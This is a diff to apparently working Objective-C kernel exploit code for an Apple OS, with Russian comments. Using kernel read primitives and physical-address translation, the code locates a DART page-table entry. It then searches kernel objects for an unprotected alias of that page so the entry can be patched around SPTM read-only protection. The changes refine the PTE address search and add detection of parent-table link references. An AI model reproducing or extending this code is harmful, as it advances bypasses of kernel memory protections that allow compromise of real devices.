@@ -6675,6 +6675,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         kpNote(r, [NSString stringWithFormat:@"  [P2] kvtophys: provVA→%#llx dartVA→%#llx (0 = walker не резолвит zone-map)",
                   (unsigned long long)kvtophys(provVA), (unsigned long long)kvtophys(dartVA)]);
         __block uint64_t pteVA = 0, origPTE = 0;   // 1.9.174: __block — scanTbl пишет их из рекурсивного блока (CI failure)
+        __block uint64_t ptePAFound = 0;   // 1.9.196: точный PA из скана (pa+o) — walker имеет слепые зоны, P4-охота по kvtophys(pteVA)=0 дала ложные "0 соседей"
         __block uint64_t ptePAMask = 0x000003FFFE000000ULL;   // 1.9.189: маска PA-поля — ставится по кодировке найденного PTE
         uint64_t kslide2 = kconstant(base) - 0xfffffff007004000ULL;
         // 1.9.164 (р.38): таргетированный PTE — дикий скан dartObj УБРАН (он и
@@ -7031,6 +7032,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                             BOOL exC = !exA && ((q & 0x000003FFFFFFC000ULL) == backingPA) && (q & ~0x000003FFFFFFC000ULL);
                             if (exA || exC) {
                                 pteVA = kva + o; origPTE = q;
+                                ptePAFound = pa + o;   // 1.9.196: точный PA — kva=phystokv(pa), walker не нужен
                                 ptePAMask = exA ? 0x0000FFFFFFFFF000ULL : 0x000003FFFFFFC000ULL;
                                 kpNote(r, [NSString stringWithFormat:@"  [P3] ★ PTE dst @ %#llx (фрейм %#llx тип %#x слот %u): %#018llx — кодировка %@",
                                           (unsigned long long)pteVA, (unsigned long long)pa, t, o / 8,
@@ -7083,7 +7085,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             // IODARTFamily пишет PTE ежедневно — через ДРУГОЙ алиас той же страницы
             // (zone-map/служебная карта), который SPTM не охраняет. Ищем указатель P
             // среди объектов цепочки с kvtophys(P) на той же странице, что ptePA.
-            uint64_t ptePA195 = kvtophys(pteVA);
+            uint64_t ptePA195 = ptePAFound ? ptePAFound : kvtophys(pteVA);   // 1.9.196: скан-PA приоритетнее walker'а (слепые зоны)
             uint64_t ptePagePA = ptePA195 & ~0x3fffULL;
             uint64_t aliasVA = 0;
             uint64_t pools[8] = { mapVA, dartVA, pipeVA, provVA,
@@ -7095,12 +7097,20 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 uint64_t s = kpLooksLikeKernelPointer(mapVA) ? kp_untag_ptr(early_kread64(mapVA + 0x170 + (uint64_t)sg * 8)) : 0;
                 if (kpLooksLikeKernelPointer(s) && kpSafeToRead(s)) { pools[npool] = s; poolSz[npool] = 0xa0; npool++; }
             }
-            int nAlias = 0;
+            int nAlias = 0, nLink = 0;
             for (int pi = 0; pi < npool && !aliasVA; pi++) {
                 uint64_t obj = pools[pi];
                 if (!kpLooksLikeKernelPointer(obj) || !kpSafeToRead(obj)) continue;
                 for (uint32_t o = 0; o + 8 <= poolSz[pi] && !aliasVA; o += 8) {
                     uint64_t P = kp_untag_ptr(early_kread64(obj + o));
+                    // 1.9.196: link-форма — родительская запись держит лист как PA>>4
+                    // (маска расширена до [14:47]: узкая 0x3ffffffc000 режет бит 40 наших страниц)
+                    uint64_t qraw = early_kread64(obj + o);
+                    if (qraw && ((qraw << 4) & 0x0000FFFFFFFFC000ULL) == ptePagePA) {
+                        nLink++;
+                        kpNote(r, [NSString stringWithFormat:@"  [P4] link-ссылка на лист: pool%d+%#x q=%#018llx ← родительская запись таблицы",
+                                  pi, o, (unsigned long long)qraw]);
+                    }
                     if (!kpLooksLikeKernelPointer(P)) continue;
                     uint64_t ppa = kvtophys(P);
                     if (ppa && (ppa & ~0x3fffULL) == ptePagePA) {
@@ -7112,7 +7122,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 }
             }
             if (!aliasVA) {
-                kpNote(r, [NSString stringWithFormat:@"  [P4] алиас не найден (соседей по PA: %d) — запись через physmap ОТМЕНЕНА (SPTM RO, паника 01:51). Нужен RE адресации таблиц драйвера", nAlias]);
+                kpNote(r, [NSString stringWithFormat:@"  [P4] алиас не найден (соседей по PA: %d, link-ссылок: %d) — запись через physmap ОТМЕНЕНА (SPTM RO, паника 01:51). Нужен RE адресации таблиц драйвера", nAlias, nLink]);
                 pteVA = 0;
             } else {
                 pteVA = aliasVA;   // дальше патч/чек идут через алиас
